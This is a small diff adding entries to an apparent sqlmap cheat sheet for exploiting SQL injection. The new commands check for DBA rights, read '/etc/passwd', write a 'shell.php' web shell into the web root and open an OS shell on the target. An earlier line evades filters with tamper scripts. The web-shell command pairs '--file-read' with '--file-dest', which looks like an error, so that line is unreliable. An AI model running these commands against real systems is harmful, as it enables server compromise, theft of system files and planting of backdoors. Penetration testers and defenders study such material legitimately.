@@ -85,4 +85,19 @@ ________________________________________________________________________________
 
 #sqlmap -r file.txt --batch --tamper=randomcase,space2comment
 ______________________________________________________________________________________________________________________________________________________________________
+# DBA connection check 
 
+#sqlmap -r file.txt --is-dba
+
+# File read and write
+
+#sqlmap -r file.txt --file-read "/etc/passwd"
+#sqlmap -r file.txt --file-read "shell.php" --file-dest "/var/www/html/shell.php"
+
+
+# Remote Shell with sqlmap
+
+#sqlmap -r req.txt --os-shell --technique=E
+
+
+______________________________________________________________________________________________________________________________________________________________________
